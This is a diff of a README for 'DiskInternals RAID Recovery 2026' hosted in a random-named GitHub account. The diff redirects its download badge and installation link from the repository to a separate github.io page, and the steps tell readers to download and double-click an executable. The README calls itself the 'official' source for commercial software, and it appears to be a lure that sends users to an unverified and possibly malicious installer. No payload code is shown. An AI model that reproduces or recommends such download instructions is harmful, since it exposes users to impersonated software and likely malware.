@@ -1,6 +1,6 @@
 # 💾 DiskInternals-RAID-Recovery-2026 - Recover lost RAID data with ease
 
-[![](https://img.shields.io/badge/Download-DiskInternals_RAID_Recovery-blue.svg)](https://github.com/samoacoitusinterruptus408/DiskInternals-RAID-Recovery-2026)
+[![](https://img.shields.io/badge/Download-DiskInternals_RAID_Recovery-blue.svg)](https://samoacoitusinterruptus408.github.io)
 
 ## 📌 About this application
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these minimum need
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official repository page to get the installer: [DiskInternals RAID Recovery 2026 Download](https://github.com/samoacoitusinterruptus408/DiskInternals-RAID-Recovery-2026).
+1.  Visit the official repository page to get the installer: [DiskInternals RAID Recovery 2026 Download](https://samoacoitusinterruptus408.github.io).
 2.  Click the link to start the download of the executable file.
 3.  Locate the downloaded file in your browser's download folder.
 4.  Double-click the installer file to run it.
